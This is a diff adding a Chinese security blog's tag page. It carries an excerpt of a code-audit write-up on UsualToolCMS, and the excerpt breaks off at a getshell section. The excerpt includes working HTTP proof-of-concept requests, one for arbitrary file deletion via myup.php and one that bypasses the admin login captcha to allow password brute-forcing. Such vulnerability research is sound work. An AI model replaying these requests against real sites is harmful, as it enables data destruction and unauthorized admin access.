@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>代码审计 :: Ca1s1&#39;Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://vuln.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://vuln.top/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="代码审计">
+<meta property="og:description" content="" />
+<meta property="og:url" content="https://vuln.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" />
+<meta property="og:site_name" content="Ca1s1&#39;Blog" />
+
+  
+    <meta property="og:image" content="https://vuln.top/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+  <link href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.xml" rel="alternate" type="application/rss+xml" title="Ca1s1&#39;Blog" />
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://vuln.top/">
+  <div class="logo">
+    Ca1s1'Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">about</a></li>
+        
+      
+        
+          <li><a href="/link/">link</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >about</a></li>
+        
+      
+        
+          <li><a href="/link/" >link</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+  <div class="posts">
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/uscms/">Uscms代码审计</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2019-07-18 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/uscms/">Uscms</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="0x01-第一处前台任意文件删除">0x01 第一处：前台任意文件删除</h1>
+<p>漏洞信息：前台myup.php文件最后一段存在任意文件删除
+代码：</p>
+<p>漏洞点：http://xxx/myup.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/1.png" alt="1"></p>
+<p>第47行只对<code>..</code>做了过滤,我仍然能任意删除网站内的文件，直接构造poc,</p>
+<p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2.png" alt="2"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3.png" alt="3"></p>
+<p>Burp POC：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/4.png" alt="4"></p>
+<pre tabindex="0"><code>POST /UsualToolCMS/myup.php HTTP/1.1
+Host: 192.168.235.242
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+X-Forwarded-For: 8.8.8.8
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+
+get=delimg&amp;imgurl=./1.php
+</code></pre><h1 id="0x02-绕过后台验证码爆破">0x02 绕过后台验证码爆破</h1>
+<p>漏洞点:http://xxx.xxx.xxx.xxx/cmsadmin/
+后台登陆时默认需要输入验证码，但是当我把验证码的参数ucode删除时，登陆依然成功</p>
+<p>1.默认情况下登陆数据包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-1.png" alt="2-1"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-2.png" alt="2-2"></p>
+<p>删除ucode参数和cookie后登陆，直接登陆成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-3.png" alt="2-3"></p>
+<p>通过burp爆破后台密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-4.png" alt="2-4"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-5.png" alt="2-5"></p>
+<pre tabindex="0"><code>POST /UsualToolCMS/cmsadmin/a_login.php?do=login HTTP/1.1
+Host: 192.168.235.242
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_login.php
+X-Forwarded-For: 8.8.8.8
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 23
+
+uuser=admin&amp;upass=admin
+</code></pre><h1 id="0x03--后台getshell">0x03  后台GETSHELL</h1>
+<p>漏洞点:http://xxx.xxx.xxx.xxx/cmsadmin/a_lang.php
+13行未对$lg做判断</p>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/uscms/"> →</a>
+          </div>
+        
+      </article>
+    
+
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+    
+  </div>
+</div>
+
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
